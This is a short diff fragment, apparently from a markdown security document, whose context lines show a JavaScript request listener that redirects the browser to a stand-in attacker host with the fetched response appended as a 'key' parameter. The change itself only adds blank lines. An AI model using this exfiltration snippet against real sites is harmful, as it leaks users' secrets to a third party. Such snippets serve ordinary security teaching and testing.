@@ -22,3 +22,5 @@ function reqListener() {
     location='//atttacker.net/log?key='+this.responseText; 
 };
 ```
+
+
